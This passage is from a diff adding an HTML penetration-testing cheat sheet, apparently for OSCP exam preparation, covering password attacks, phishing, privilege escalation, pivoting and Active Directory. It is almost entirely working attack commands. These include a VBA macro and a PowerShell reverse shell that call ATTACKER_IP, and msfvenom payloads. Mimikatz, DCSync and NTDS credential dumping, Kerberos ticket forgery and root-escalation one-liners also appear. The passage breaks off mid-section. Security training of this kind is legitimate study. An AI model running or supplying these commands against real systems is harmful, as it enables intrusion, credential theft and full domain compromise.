+                  <tr><td>MySQL 4.1+</td><td>300</td><td><code>hashcat -m 300 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>MSSQL (2012+)</td><td>1731</td><td><code>hashcat -m 1731 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>KeePass</td><td>13400</td><td><code>hashcat -m 13400 hash.txt rockyou.txt</code></td></tr>
+                </tbody>
+              </table>
+
+              <pre><code class="language-bash"># John the Ripper — auto-detect hash type
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+
+# Extract hashes from files
+ssh2john id_rsa &gt; id_rsa.hash
+keepass2john Database.kdbx &gt; keepass.hash
+zip2john backup.zip &gt; zip.hash
+pdf2john.pl document.pdf &gt; pdf.hash</code></pre>
+
+              <h3 id="pass-spraying">3.3 Credential Spraying</h3>
+              <p>Try a small number of passwords against many accounts to avoid lockout.</p>
+
+              <pre><code class="language-bash"># NetExec — SMB password spray
+netexec smb $IP -u users.txt -p 'Password123!' --continue-on-success
+netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
+
+# NetExec — WinRM
+netexec winrm $IP -u users.txt -p 'Password123!'
+
+# NetExec — LDAP
+netexec ldap $IP -u users.txt -p 'Password123!'
+
+# Kerbrute — Kerberos pre-auth spray (stealthier)
+kerbrute passwordspray -d corp.local --dc $IP users.txt 'Password123!'</code></pre>
+
+              <h3 id="pass-mimikatz">3.4 Mimikatz</h3>
+              <p>Extract credentials from Windows memory, tickets, and caches.</p>
+
+              <pre><code class="language-powershell"># Dump logon passwords from memory
+privilege::debug
+sekurlsa::logonpasswords
+
+# Dump SAM database
+lsadump::sam
+
+# Dump cached domain credentials
+lsadump::cache
+
+# Extract Kerberos tickets
+sekurlsa::tickets /export
+
+# DCSync — replicate password data from DC
+lsadump::dcsync /user:corp\krbtgt
+lsadump::dcsync /user:corp\Administrator
+
+# Pass-the-Hash
+sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH_HERE /run:cmd.exe</code></pre>
+
+              <pre><code class="language-powershell"># One-liner versions (from cmd)
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:corp\Administrator" "exit"
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:cmd.exe" "exit"</code></pre>
+
+              <h3 id="pass-wordlists">3.5 Wordlists &amp; Rules</h3>
+              <p>Key wordlists and mutation rules for password attacks.</p>
+
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Wordlist</th>
+                    <th>Path</th>
+                    <th>Use Case</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>rockyou.txt</td><td><code>/usr/share/wordlists/rockyou.txt</code></td><td>General password cracking</td></tr>
+                  <tr><td>directory-list-2.3-medium</td><td><code>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></td><td>Web directory brute force</td></tr>
+                  <tr><td>raft-medium-directories</td><td><code>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code></td><td>Web directory brute force</td></tr>
+                  <tr><td>common.txt</td><td><code>/usr/share/seclists/Discovery/Web-Content/common.txt</code></td><td>Quick web scan</td></tr>
+                  <tr><td>subdomains-top1million-5000</td><td><code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td><td>DNS brute force</td></tr>
+                  <tr><td>xato-net-10-million-usernames</td><td><code>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</code></td><td>Username enumeration</td></tr>
+                </tbody>
+              </table>
+
+              <pre><code class="language-bash"># Generate a custom wordlist from a website
+cewl http://$IP -m 6 -w cewl_wordlist.txt
+
+# Mutate a wordlist with hashcat rules
+hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt &gt; mutated.txt
+
+# Generate passwords with crunch
+crunch 8 8 -t ,%^Corp -o crunch_wordlist.txt</code></pre>
+
+
+<!-- ============================================================ -->
+<!-- 4. CLIENT-SIDE ATTACKS                                        -->
+<!-- ============================================================ -->
+<h2 id="client-side">4. Client-Side Attacks</h2>
+
+              <h3 id="client-macros">4.1 Macro Payloads</h3>
+              <p>Office macros remain a reliable initial access vector. VBA runs when the document is opened.</p>
+
+              <pre><code class="language-bash"># Generate a VBA macro payload
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vba -o macro.vba</code></pre>
+
+              <pre><code class="language-bash"># Basic VBA reverse shell (paste into macro editor)
+Sub AutoOpen()
+    Dim cmd As String
+    cmd = "powershell -ep bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"""
+    Shell cmd, vbHide
+End Sub</code></pre>
+
+              <pre><code class="language-bash"># PowerShell download cradle (shell.ps1 on attacker HTTP server)
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 443)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | % {0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String)
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback + "PS " + (pwd).Path + "&gt; ")
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()</code></pre>
+
+              <h3 id="client-library">4.2 Windows Library Files</h3>
+              <p>A <code>.Library-ms</code> file can point to a WebDAV share that serves a malicious shortcut or payload.</p>
+
+              <pre><code class="language-bash"># 1. Create a .Library-ms file pointing to your WebDAV server
+# 2. Host a .lnk shortcut on the WebDAV share that runs a reverse shell
+# 3. Deliver the .Library-ms via email or file share
+
+# Start a WebDAV server
+wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/webdav --auth=anonymous</code></pre>
+
+              <h3 id="client-phishing">4.3 Phishing</h3>
+              <p>Deliver payloads via email with pretexting and social engineering.</p>
+
+              <pre><code class="language-bash"># Send phishing email via swaks
+swaks --to victim@corp.com --from it-support@corp.com \
+  --server $IP --port 25 \
+  --header "Subject: Urgent Update Required" \
+  --body "Please review the attached document." \
+  --attach @payload.docx
+
+# Send via sendemail
+sendemail -f it-support@corp.com -t victim@corp.com \
+  -u "Urgent Update Required" -m "Please review the attached document." \
+  -a payload.docx -s $IP -o tls=no</code></pre>
+
+
+<!-- ============================================================ -->
+<!-- 5. WINDOWS PRIVILEGE ESCALATION                               -->
+<!-- ============================================================ -->
+<h2 id="windows-privesc">5. Windows Privilege Escalation</h2>
+
+              <h3 id="winpe-enum">5.1 Enumeration</h3>
+              <p>Gather system information, current privileges, and potential escalation paths.</p>
+
+              <pre><code class="language-powershell"># System info
+whoami /all
+systeminfo
+hostname
+net user
+net localgroup administrators
+
+# Check current privileges
+whoami /priv
+
+# Automated enumeration
+.\winPEASany.exe
+.\Seatbelt.exe -group=all
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1'); Invoke-AllChecks"</code></pre>
+
+              <pre><code class="language-powershell"># Search for passwords in files
+findstr /si "password" *.txt *.xml *.ini *.config
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+# PowerShell history
+type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Saved credentials
+cmdkey /list
+runas /savecred /user:admin cmd.exe</code></pre>
+
+              <h3 id="winpe-services">5.2 Service Misconfigurations</h3>
+              <p>Vulnerable services can be hijacked if they have weak permissions, unquoted paths, or writable binaries.</p>
+
+              <pre><code class="language-powershell"># Unquoted service paths
+wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
+
+# Weak service permissions (check with accesschk)
+accesschk.exe /accepteula -uwcqv "Everyone" *
+accesschk.exe /accepteula -uwcqv "Users" *
+
+# Modify a vulnerable service
+sc config [svc_name] binpath= "C:\temp\shell.exe"
+sc stop [svc_name]
+sc start [svc_name]
+
+# Replace a writable service binary
+copy C:\temp\shell.exe "C:\Program Files\Vuln Service\service.exe"
+sc stop [svc_name] &amp;&amp; sc start [svc_name]
+
+# DLL hijacking — place a malicious DLL in a writable PATH directory
+# Use procmon to find missing DLLs loaded by a service</code></pre>
+
+              <h3 id="winpe-tokens">5.3 Token Impersonation</h3>
+              <p>If you have SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, use potato attacks.</p>
+
+              <pre><code class="language-powershell"># Check for the privilege
+whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
+
+# PrintSpoofer (Windows 10 / Server 2016-2019)
+.\PrintSpoofer64.exe -i -c "cmd /c C:\temp\shell.exe"
+
+# GodPotato (broad Windows version support)
+.\GodPotato.exe -cmd "C:\temp\shell.exe"
+
+# JuicyPotatoNG
+.\JuicyPotatoNG.exe -t * -p "C:\temp\shell.exe"</code></pre>
+
+              <h3 id="winpe-creds">5.4 Stored Credentials</h3>
+              <p>Look for cached and stored credentials throughout the system.</p>
+
+              <pre><code class="language-powershell"># Saved credentials
+cmdkey /list
+runas /savecred /user:admin "cmd /c C:\temp\shell.exe"
+
+# SAM and SYSTEM files (if accessible)
+reg save HKLM\SAM C:\temp\SAM
+reg save HKLM\SYSTEM C:\temp\SYSTEM
+# Transfer to attacker, then:
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+# WiFi passwords
+netsh wlan show profile
+netsh wlan show profile [SSID] key=clear
+
+# Autologon credentials
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</code></pre>
+
+              <h3 id="winpe-schtask">5.5 Scheduled Tasks</h3>
+              <p>Writable scheduled task scripts or binaries can be replaced for privilege escalation.</p>
+
+              <pre><code class="language-powershell"># List all scheduled tasks
+schtasks /query /fo TABLE /nh
+schtasks /query /fo LIST /v
+
+# Check permissions on task binaries
+icacls "C:\path\to\task\binary.exe"
+
+# If writable, replace with a reverse shell
+copy C:\temp\shell.exe "C:\path\to\task\binary.exe"
+# Wait for the task to execute, or trigger it if possible</code></pre>
+
+              <h3 id="winpe-alwayselevated">5.6 AlwaysInstallElevated</h3>
+              <p>If both registry keys are set to 1, any user can install MSI packages as SYSTEM.</p>
+
+              <pre><code class="language-powershell"># Check the registry keys
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# If both return 0x1, generate a malicious MSI
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o evil.msi
+
+# Install it (runs as SYSTEM)
+msiexec /quiet /qn /i C:\temp\evil.msi</code></pre>
+
+              <h3 id="winpe-kernel">5.7 Kernel Exploits</h3>
+              <p>Use as a last resort. Match the OS version and patch level to known exploits.</p>
+
+              <pre><code class="language-powershell"># Identify OS and patches
+systeminfo
+wmic qfe list
+
+# Windows Exploit Suggester
+python3 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt
+
+# Common kernel exploits
+# MS16-032 (Secondary Logon) — Windows 7-10, Server 2008-2012
+# CVE-2021-1732 (Win32k) — Windows 10
+# CVE-2021-36934 (HiveNightmare/SeriousSAM) — Windows 10 21H1</code></pre>
+
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Technique</th>
+                    <th>Privilege Needed</th>
+                    <th>Tool</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>Unquoted service path</td><td>Write to service path directory</td><td>Manual / PowerUp</td></tr>
+                  <tr><td>Weak service permissions</td><td>Service config modify</td><td>accesschk / PowerUp</td></tr>
+                  <tr><td>DLL hijacking</td><td>Write to DLL search path</td><td>Procmon + custom DLL</td></tr>
+                  <tr><td>Token impersonation</td><td>SeImpersonate / SeAssignPrimaryToken</td><td>PrintSpoofer / GodPotato</td></tr>
+                  <tr><td>AlwaysInstallElevated</td><td>Registry keys set</td><td>msfvenom MSI</td></tr>
+                  <tr><td>Stored credentials</td><td>cmdkey entries</td><td>runas /savecred</td></tr>
+                  <tr><td>Writable scheduled task</td><td>Write to task binary</td><td>Manual</td></tr>
+                  <tr><td>Kernel exploit</td><td>Varies</td><td>Precompiled binaries</td></tr>
+                </tbody>
+              </table>
+
+
+<!-- ============================================================ -->
+<!-- 6. LINUX PRIVILEGE ESCALATION                                 -->
+<!-- ============================================================ -->
+<h2 id="linux-privesc">6. Linux Privilege Escalation</h2>
+
+              <h3 id="linpe-enum">6.1 Enumeration</h3>
+              <p>Gather system details, user privileges, and potential escalation vectors.</p>
+
+              <pre><code class="language-bash"># Basic enumeration
+id
+whoami
+hostname
+uname -a
+cat /etc/os-release
+
+# Sudo permissions
+sudo -l
+
+# Automated enumeration
+./linpeas.sh
+./linux-smart-enumeration.sh -l 1
+./LinEnum.sh</code></pre>
+
+              <pre><code class="language-bash"># Network and connections
+ip a
+ss -tulnp
+cat /etc/hosts
+
+# Interesting files
+find / -writable -type f 2&gt;/dev/null | grep -v proc
+find / -name "*.bak" -o -name "*.old" -o -name "*.conf" 2&gt;/dev/null
+cat /etc/crontab
+ls -la /etc/cron*
+
+# Search for passwords
+grep -rli "password" /etc/ 2&gt;/dev/null
+find / -name "*.txt" -exec grep -li "password" {} \; 2&gt;/dev/null
+cat /home/*/.bash_history 2&gt;/dev/null</code></pre>
+
+              <h3 id="linpe-suid">6.2 SUID Binaries &amp; sudo</h3>
+              <p>SUID binaries run as the file owner. Check <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a> for exploitation methods.</p>
+
+              <pre><code class="language-bash"># Find SUID binaries
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# Find SGID binaries
+find / -perm -2000 -type f 2&gt;/dev/null
+
+# Exploit examples (check GTFOBins for the specific binary)
+# If /usr/bin/find has SUID:
+/usr/bin/find . -exec /bin/sh -p \;
+
+# If /usr/bin/python3 has SUID:
+/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# sudo abuse (if sudo -l shows entries)
+# (ALL) NOPASSWD: /usr/bin/vi
+sudo /usr/bin/vi -c ':!/bin/sh'
+
+# (ALL) NOPASSWD: /usr/bin/awk
+sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+
+# LD_PRELOAD (if env_keep += LD_PRELOAD in sudo -l)
+# Compile: gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
+# Execute: sudo LD_PRELOAD=/tmp/pe.so [any_allowed_command]</code></pre>
+
+              <h3 id="linpe-cron">6.3 Cron Jobs &amp; PATH Hijacking</h3>
+              <p>Writable cron scripts or missing absolute paths can be exploited.</p>
+
+              <pre><code class="language-bash"># View cron jobs
+cat /etc/crontab
+ls -la /etc/cron.d/
+crontab -l
+ls -la /var/spool/cron/crontabs/
+
+# If a cron job runs a script you can write to:
+echo '#!/bin/bash' &gt; /path/to/writable_script.sh
+echo 'cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash' &gt;&gt; /path/to/writable_script.sh
+# Wait for cron to run, then: /tmp/rootbash -p
+
+# PATH hijacking — if cron calls a command without absolute path
+# and runs as root, create a malicious version in a writable PATH dir
+echo '#!/bin/bash' &gt; /tmp/vulnerable_command
+echo 'cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash' &gt;&gt; /tmp/vulnerable_command
+chmod +x /tmp/vulnerable_command
+export PATH=/tmp:$PATH</code></pre>
+
+              <h3 id="linpe-caps">6.4 Capabilities</h3>
+              <p>Linux capabilities grant specific root-level powers to non-root binaries.</p>
+
+              <pre><code class="language-bash"># List files with capabilities
+getcap -r / 2&gt;/dev/null
+
+# Exploit cap_setuid (e.g., python3)
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# Exploit cap_dac_read_search (e.g., tar)
+tar -czf /tmp/shadow.tar.gz /etc/shadow
+tar -xf /tmp/shadow.tar.gz -C /tmp/
+
+# Exploit cap_net_raw (e.g., tcpdump) — sniff credentials
+tcpdump -i any -w /tmp/capture.pcap</code></pre>
+
+              <h3 id="linpe-groups">6.5 Dangerous Group Memberships</h3>
+              <p>Membership in certain groups grants elevated access.</p>
+
+              <pre><code class="language-bash"># Check group membership
+id
+
+# docker group — mount root filesystem
+docker run -v /:/host -it alpine chroot /host
+
+# lxd/lxc group — same concept
+lxc init ubuntu:18.04 privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+
+# disk group — direct disk access
+debugfs /dev/sda1
+# Inside debugfs: cat /root/.ssh/id_rsa
+
+# adm group — read log files
+find /var/log -readable -type f 2&gt;/dev/null</code></pre>
+
+              <h3 id="linpe-kernel">6.6 Kernel Exploits</h3>
+              <p>Match the kernel version to known exploits as a last resort.</p>
+
+              <pre><code class="language-bash"># Check kernel version
+uname -r
+cat /proc/version
+
+# Linux Exploit Suggester
+./linux-exploit-suggester.sh
+
+# Common kernel exploits
+# DirtyPipe (CVE-2022-0847) — kernel 5.8+
+# DirtyCow (CVE-2016-5195) — kernel 2.6.22 - 4.8.3
+# PwnKit (CVE-2021-4034) — pkexec, most distros</code></pre>
+
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Technique</th>
+                    <th>What to Look For</th>
+                    <th>Reference</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>SUID/SGID</td><td>Custom or unusual SUID binaries</td><td><a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a></td></tr>
+                  <tr><td>sudo misconfig</td><td><code>sudo -l</code> output with NOPASSWD or wildcards</td><td>GTFOBins</td></tr>
+                  <tr><td>Cron jobs</td><td>Writable scripts, missing absolute paths</td><td><code>cat /etc/crontab</code></td></tr>
+                  <tr><td>Capabilities</td><td><code>cap_setuid</code>, <code>cap_dac_read_search</code></td><td><code>getcap -r / 2&gt;/dev/null</code></td></tr>
+                  <tr><td>Writable /etc/passwd</td><td>Add a root-level user</td><td><code>openssl passwd -1 password</code></td></tr>
+                  <tr><td>Writable /etc/shadow</td><td>Replace root hash</td><td><code>mkpasswd -m sha-512 password</code></td></tr>
+                  <tr><td>Docker/LXD group</td><td>Mount host filesystem</td><td><code>id</code></td></tr>
+                  <tr><td>NFS no_root_squash</td><td>Create SUID binary from attacker</td><td><code>showmount -e $IP</code></td></tr>
+                  <tr><td>Kernel exploit</td><td>Outdated kernel version</td><td>linux-exploit-suggester</td></tr>
+                </tbody>
+              </table>
+
+
+<!-- ============================================================ -->
+<!-- 7. TUNNELING & PIVOTING                                       -->
+<!-- ============================================================ -->
+<h2 id="tunneling">7. Tunneling &amp; Pivoting</h2>
+
+              <h3 id="tunnel-ssh">7.1 SSH Forwarding</h3>
+              <p>SSH tunnels let you reach internal networks through a compromised host.</p>
+
+              <pre><code class="language-bash"># Local port forwarding — access internal_host:80 through pivot
+ssh -L 8080:INTERNAL_HOST:80 user@PIVOT_IP
+# Now browse http://127.0.0.1:8080
+
+# Dynamic port forwarding (SOCKS proxy)
+ssh -D 1080 user@PIVOT_IP
+# Configure proxychains: socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn INTERNAL_HOST
+
+# Remote port forwarding — expose your listener through pivot
+ssh -R 9999:127.0.0.1:443 user@PIVOT_IP
+# The pivot now forwards its port 9999 to your local 443
+
+# Remote dynamic port forwarding (OpenSSH 7.6+)
+ssh -R 1080 user@ATTACKER_IP
+# SOCKS proxy now runs on attacker side</code></pre>
+
+              <pre><code class="language-bash"># SSH on Windows (if OpenSSH is installed)
+ssh.exe -L 8080:INTERNAL_HOST:80 user@PIVOT_IP
+
+# Plink (PuTTY CLI) — for older Windows
+plink.exe -ssh -L 8080:INTERNAL_HOST:80 user@PIVOT_IP
+# Accept host key automatically:
+cmd.exe /c echo y | plink.exe -ssh -L 8080:INTERNAL_HOST:80 -l user -pw password PIVOT_IP</code></pre>
+
+              <h3 id="tunnel-ligolo">7.2 Ligolo-ng</h3>
+              <p>Creates a virtual tunnel interface for transparent pivoting without SOCKS.</p>
+
+              <pre><code class="language-bash"># On attacker — start the proxy
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# On pivot host — start the agent
+./agent -connect ATTACKER_IP:11601 -ignore-cert
+
+# In ligolo proxy console
+session                     # select the agent session
+start                       # start the tunnel
+
+# Add route to internal subnet
+sudo ip route add 172.16.1.0/24 dev ligolo
+
+# Now scan or connect directly
+nmap -sT -Pn 172.16.1.10
+evil-winrm -i 172.16.1.10 -u admin -p password</code></pre>
+
+              <h3 id="tunnel-chisel">7.3 Chisel</h3>
+              <p>HTTP tunneling tool useful when SSH is not available.</p>
+
+              <pre><code class="language-bash"># Reverse SOCKS proxy (pivot connects back to attacker)
+# On attacker:
+./chisel server --reverse --port 8000
+
+# On pivot:
+./chisel client ATTACKER_IP:8000 R:socks
+# SOCKS5 proxy is now on attacker at 127.0.0.1:1080
+
+# Forward a specific port
+# On attacker:
+./chisel server --port 8000
+# On pivot:
+./chisel client ATTACKER_IP:8000 8080:INTERNAL_HOST:80</code></pre>
+
+              <h3 id="tunnel-socat">7.4 Socat &amp; Netsh</h3>
+              <p>Simple port forwarding and relaying on the pivot host.</p>
+
+              <pre><code class="language-bash"># Socat — forward local port 8080 to internal host port 80
+socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80
+
+# Socat — forward with bind address
+socat TCP-LISTEN:8080,fork,bind=0.0.0.0 TCP:INTERNAL_HOST:80
+
+# Socat — encrypted relay (generate certs first)
+openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -out bind.crt
+cat bind.key bind.crt &gt; bind.pem
+socat OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork TCP:INTERNAL_HOST:80</code></pre>
+
+              <pre><code class="language-powershell"># Netsh — Windows port forwarding (requires admin)
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_HOST
+
+# List forwarding rules
+netsh interface portproxy show all
+
+# Remove a rule
+netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
+
+# Allow the port through firewall
+netsh advfirewall firewall add rule name="fwd_8080" protocol=TCP dir=in localport=8080 action=allow</code></pre>
+
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Tool</th>
+                    <th>Best For</th>
+                    <th>Requires on Pivot</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>SSH local forward</td><td>Single port access to internal service</td><td>SSH client</td></tr>
+                  <tr><td>SSH dynamic (SOCKS)</td><td>Multiple internal hosts/ports</td><td>SSH client</td></tr>
+                  <tr><td>Ligolo-ng</td><td>Full subnet routing, transparent pivoting</td><td>Agent binary</td></tr>
+                  <tr><td>Chisel</td><td>HTTP tunnel when SSH is unavailable</td><td>Client binary</td></tr>
+                  <tr><td>Socat</td><td>Simple relay, no external tools needed</td><td>Socat binary</td></tr>
+                  <tr><td>Netsh</td><td>Windows port forwarding, built-in</td><td>Admin access (built-in)</td></tr>
+                </tbody>
+              </table>
+
+
+<!-- ============================================================ -->
+<!-- 8. ACTIVE DIRECTORY                                           -->
+<!-- ============================================================ -->
+<h2 id="active-directory">8. Active Directory</h2>
+
+              <h3 id="ad-enum">8.1 Enumeration</h3>
+              <p>Map the domain structure, users, groups, and attack paths.</p>
+
+              <pre><code class="language-bash"># BloodHound collection (from Linux)
+bloodhound-python -u 'user' -p 'password' -d corp.local -ns $DC_IP -c all
+
+# SharpHound (from Windows)
+.\SharpHound.exe --CollectionMethods All --Domain corp.local
+# Import the .zip into BloodHound GUI</code></pre>
+
+              <pre><code class="language-powershell"># PowerView enumeration
+Import-Module .\PowerView.ps1
+
+# Domain info
+Get-Domain
+Get-DomainController
+Get-DomainPolicy
+
+# Users
+Get-DomainUser | Select-Object samaccountname, description, memberof
+Get-DomainUser -SPN  # Kerberoastable users
+
+# Groups
+Get-DomainGroup | Select-Object samaccountname
+Get-DomainGroupMember -Identity "Domain Admins"
+
+# Computers
+Get-DomainComputer | Select-Object dnshostname, operatingsystem
+
+# ACLs — find interesting permissions
+Find-InterestingDomainAcl -ResolveGUIDs
+# Shares
+Find-DomainShare -CheckShareAccess</code></pre>
+
+              <pre><code class="language-bash"># ldapsearch — from Linux
+ldapsearch -x -H ldap://$DC_IP -D 'user@corp.local' -w 'password' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf
+
+# enum4linux-ng
+enum4linux-ng -A $DC_IP -u 'user' -p 'password'
+
+# NetExec enumeration
+netexec smb $DC_IP -u 'user' -p 'password' --users
+netexec smb $DC_IP -u 'user' -p 'password' --groups
+netexec smb $DC_IP -u 'user' -p 'password' --shares</code></pre>
+
+              <h3 id="ad-attacks">8.2 Attacks</h3>
+              <p>Common AD exploitation techniques for the OSCP exam.</p>
+
+              <pre><code class="language-bash"># AS-REP Roasting — no pre-auth required
+impacket-GetNPUsers -dc-ip $DC_IP corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
+# Crack: hashcat -m 18200 asrep.txt rockyou.txt
+
+# Kerberoasting — request TGS for SPNs
+impacket-GetUserSPNs -dc-ip $DC_IP corp.local/user:password -outputfile kerberoast.txt
+# Crack: hashcat -m 13100 kerberoast.txt rockyou.txt
+
+# Targeted Kerberoast (if you have GenericWrite on a user)
+# Set an SPN on the target, then Kerberoast it
+Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='fake/spn'}
+impacket-GetUserSPNs -dc-ip $DC_IP corp.local/user:password -outputfile targeted.txt</code></pre>
+
+              <pre><code class="language-bash"># Pass-the-Hash
+impacket-psexec -hashes :NTLM_HASH administrator@$IP
+impacket-wmiexec -hashes :NTLM_HASH administrator@$IP
+evil-winrm -i $IP -u administrator -H NTLM_HASH
+netexec smb $IP -u administrator -H NTLM_HASH --exec-method smbexec -x "whoami"
+
+# DCSync — extract all domain hashes (requires Replicating Directory Changes)
+impacket-secretsdump -dc-ip $DC_IP corp.local/admin:password@$DC_IP
+impacket-secretsdump -dc-ip $DC_IP -hashes :NTLM_HASH corp.local/admin@$DC_IP</code></pre>
+
+              <pre><code class="language-bash"># NTLM relay — capture and relay Net-NTLMv2 hashes
+# Set up Responder to capture hashes
+sudo responder -I eth0 -wrf
+
+# Relay captured authentication (disable SMB/HTTP in Responder first)
+impacket-ntlmrelayx -t smb://$IP -smb2support -e shell.exe
+impacket-ntlmrelayx -t ldap://$DC_IP --escalate-user compromised_user
+
+# Force authentication (trigger an SMB connection back to you)
+# PetitPotam (unauthenticated in some cases)
+python3 PetitPotam.py ATTACKER_IP $DC_IP
+# PrinterBug / SpoolSample
+python3 printerbug.py corp.local/user:password@$DC_IP ATTACKER_IP</code></pre>
+
+              <pre><code class="language-bash"># Cached AD credentials — extract from compromised machines
+# LSASS dump
+impacket-secretsdump admin:password@$IP
+# From SAM/SYSTEM/SECURITY
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+# Shadow copies on DC
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</code></pre>
+
+              <h3 id="ad-tickets">8.3 Kerberos Tickets &amp; Persistence</h3>
+              <p>Forge Kerberos tickets for persistence and access to specific services.</p>
+
+              <pre><code class="language-bash"># Silver Ticket — forge a TGS for a specific service
+# Requirements: SPN, domain SID, service account NTLM hash
+# Get domain SID:
+impacket-lookupsid corp.local/user:password@$DC_IP
+
+# Forge the ticket
+impacket-ticketer -nthash SERVICE_NTLM -domain-sid S-1-5-21-... -domain corp.local -spn HTTP/web.corp.local fakeuser
+export KRB5CCNAME=fakeuser.ccache
+# Use the ticket
+impacket-psexec -k -no-pass corp.local/fakeuser@web.corp.local</code></pre>
+
+              <pre><code class="language-bash"># Golden Ticket — forge a TGT (need krbtgt NTLM hash)
+# Get krbtgt hash via DCSync first
+impacket-secretsdump -dc-ip $DC_IP corp.local/admin:password@$DC_IP | grep krbtgt
+
+# Forge the ticket
+impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-... -domain corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+# Use the ticket
+impacket-psexec -k -no-pass corp.local/Administrator@dc.corp.local
+impacket-wmiexec -k -no-pass corp.local/Administrator@dc.corp.local</code></pre>
+
+              <pre><code class="language-powershell"># Mimikatz — Golden Ticket from Windows
+kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
+# Now access any resource
+dir \\dc.corp.local\c$
+
+# Mimikatz — Silver Ticket from Windows
+kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:web.corp.local /service:http /rc4:SERVICE_HASH /ptt</code></pre>
+
+              <h3 id="ad-lateral">8.4 Lateral Movement</h3>
+              <p>Move across the domain using obtained credentials or hashes.</p>
+
+              <pre><code class="language-bash"># From Linux (Impacket tools)
+impacket-psexec corp.local/admin:password@$IP
+impacket-wmiexec corp.local/admin:password@$IP
+impacket-smbexec corp.local/admin:password@$IP
+impacket-atexec corp.local/admin:password@$IP "whoami"
+
+# Evil-WinRM
+evil-winrm -i $IP -u admin -p password
+
+# xfreerdp
